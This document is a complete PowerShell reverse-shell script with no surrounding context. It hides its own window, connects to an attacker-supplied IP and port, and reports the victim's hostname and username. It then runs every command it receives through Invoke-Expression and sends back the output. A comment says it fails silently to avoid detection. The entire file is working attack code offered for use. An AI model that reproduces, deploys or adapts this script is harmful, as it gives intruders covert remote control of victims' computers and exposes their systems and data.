param(
    [Parameter(Mandatory=$true)]
    [string]$AttackerIP,
    
    [Parameter(Mandatory=$true)]
    [int]$Port
)

# Hide PowerShell window
$WinStyle = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(int hWnd, int nCmdShow);' -Name "WinAPI" -Namespace "Win32Functions" -PassThru
$null = $WinStyle::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)

# Connect to attacker
try {
    $client = New-Object System.Net.Sockets.TCPClient($AttackerIP, $Port)
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    
    # Send initial connection message
    $writer.WriteLine("[+] Connected to $AttackerIP`:$Port on " + (Get-Date))
    $writer.WriteLine("[+] Hostname: $env:COMPUTERNAME")
    $writer.WriteLine("[+] Username: $env:USERNAME")
    $writer.WriteLine("")
    
    # Interactive shell loop
    while ($true) {
        $writer.Write("PS " + (Get-Location).Path + "> ")
        $cmd = $reader.ReadLine()
        if ($cmd -eq "exit") { break }
        if ([string]::IsNullOrWhiteSpace($cmd)) { continue }
        
        try {
            $result = Invoke-Expression $cmd 2>&1 | Out-String
            if ($result) { $writer.WriteLine($result) }
        } catch {
            $writer.WriteLine("Error: $_")
        }
    }
    
    $client.Close()
} catch {
    # Silent fail - no error messages to avoid detection
    exit
}
